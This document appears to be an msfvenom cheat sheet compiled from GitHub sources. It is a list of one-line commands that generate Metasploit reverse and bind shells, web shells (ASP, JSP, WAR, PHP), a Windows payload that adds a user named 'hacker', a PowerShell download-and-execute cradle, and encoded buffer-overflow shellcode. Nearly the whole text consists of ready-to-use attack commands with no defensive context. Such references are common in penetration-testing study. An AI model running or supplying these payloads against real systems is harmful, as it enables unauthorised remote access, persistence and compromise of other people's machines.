MSFVenom Payload Generation One-Liner	Description
source: https://github.com/frizb/MSF-Venom-Cheatsheet, https://gist.github.com/ninp0/efd3f374725fba0427edfe63ca4953f1

General
msfvenom -l payloads	List available payloads
msfvenom -p PAYLOAD --list-options	List payload options
msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP	Payload Encoding

Shellcode for Buffer Overflow
For BoF (pivot) most likely a bind is useful.
Bind windows x86:
msfvenom -p windows/shell_bind_tcp RHOST=10.11.11.11 LPORT=1337 -b '\x00\x0a' -f c
Bind windows x64
msfvenom --smallest --bad-chars '\x00\x0a' -f c --arch x64 --platform windows --payload windows/x64/shell_bind_tcp RHOST=0.0.0.0 LPORT=443 -f c


Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf	                    Linux Meterpreter reverse shell x86 multi stage
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	                        Linux Meterpreter bind shell x86 multi stage
msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf                                    	Linux bind shell x64 single stage
msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	                            Linux reverse shell x64 single stage

Bind Linux execution
msfvenom -p linux/x64/shell/bind_tcp -f elf -a x64 --platform linux LPORT=1234 -o staged_bind_tcp_x64
chmod a+x staged_bind_tcp_x64
./staged_bind_tcp_x64


Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	                Windows Meterpreter reverse shell
msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe	                                   Windows Meterpreter http reverse shell

msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe	                    Windows Meterpreter bind shell
msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	                            Windows CMD Multi Stage
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	                            Windows CMD Single Stage
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe	                            Windows add user

Unix
msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py	                                Python Shell
msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh	                                    BASH Shell
msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl	                                    PERL Shell

Webshells
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp	                ASP Meterpreter shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp	                            JSP Shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war	                            WAR Shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php	pbcopy && echo '?php '
msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php	                        Php Reverse Shell

msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f python	Windows Exec Nishang Powershell in python


Untested shellcode:
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x00\xA0"	Bad characters shikata_ga_nai
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x00\xA0"

msfvenom --smallest --format hex --arch x86 --platform windows --encoder generic/none --payload windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=443 EXITFUNC=none

msfvenom --smallest --bad-chars '\x00\x20' --format c --arch x86 --platform windows --encoder x86/shikata_ga_nai --payload windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=443 EXITFUNC=none

msfvenom --smallest --bad-chars '\x00\x20' --format ruby --arch x86 --platform windows --encoder x86/shikata_ga_nai --payload windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=443 EXITFUNC=process

msfvenom --smallest --bad-chars '\x00\x20' --format python --arch x86 --platform windows --encoder x86/shikata_ga_nai --payload windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=443 EXITFUNC=thread

msfvenom --smallest --bad-chars '\x00\x20' --format java --arch x86 --platform windows --encoder x86/shikata_ga_nai --payload windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=443 EXITFUNC=seh

msfvenom --smallest --bad-chars '\x00\x20' --format perl --arch x86 --platform windows --encoder x86/shikata_ga_nai --payload windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=443

msfvenom --smallest --bad-chars '\x00\x20' --format bash --arch x86 --platform windows --encoder x86/shikata_ga_nai --payload windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=443

msfvenom --smallest --bad-chars '\x00\x20' --format raw --arch x64 --platform linux --encoder x86/shikata_ga_nai --payload linux/x64/meterpreter_reverse_tcp LHOST=0.0.0.0 LPORT=443
